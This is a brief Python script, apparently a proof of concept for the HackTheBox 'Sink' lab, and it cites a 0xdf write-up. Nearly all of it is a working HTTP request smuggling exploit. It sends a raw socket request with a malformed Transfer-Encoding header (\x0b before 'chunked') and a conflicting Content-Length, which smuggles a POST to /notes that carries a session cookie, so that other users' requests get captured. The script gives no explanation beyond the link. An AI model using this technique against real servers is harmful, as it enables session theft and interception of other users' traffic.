#!/usr/bin/python3

##
##
## chunkeddddddd
## https://0xdf.gitlab.io/2021/09/18/htb-sink.html
##
##

import os,sys,re
import socket

##
##

host = "127.0.0.1"
port = 5000

body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://10.10.10.225:5000/notes
Content-Type: text/plain
Content-Length: 50 
Cookie: session=eyJlbWFpbCI6IjB4ZGZAc2luay5odGIifQ.YAri4g.PYo0eJg0oYeW_8_k5QKNi2R78QM

note=""".replace('\n','\r\n')

header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)

##
##
